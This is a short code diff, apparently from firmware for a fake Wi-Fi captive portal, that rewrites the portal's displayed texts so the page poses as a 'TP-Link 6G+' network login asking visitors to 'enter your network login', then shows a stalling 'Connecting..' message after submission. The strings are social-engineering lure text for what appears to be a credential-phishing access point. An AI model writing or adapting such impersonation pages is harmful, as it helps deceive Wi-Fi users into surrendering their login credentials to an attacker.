@@ -14,8 +14,8 @@
 const char* PASSWORD = "pc";
 
 // Textos padrão.
-#define SUBTITLE "A internet da EMPRESA!"
-#define TITLE "Acesso GUEST"
+#define SUBTITLE "TP-Link 6G+"
+#define TITLE "Acesso 6G Network "
 #define BODY "To connect to our network, enter your network login. Enjoy the fastest internet from the COMPANY"
 #define POST_TITLE "Connecting.."
 #define POST_BODY "If your access is denied,, Aguarde... </br></br> Obrigado!"
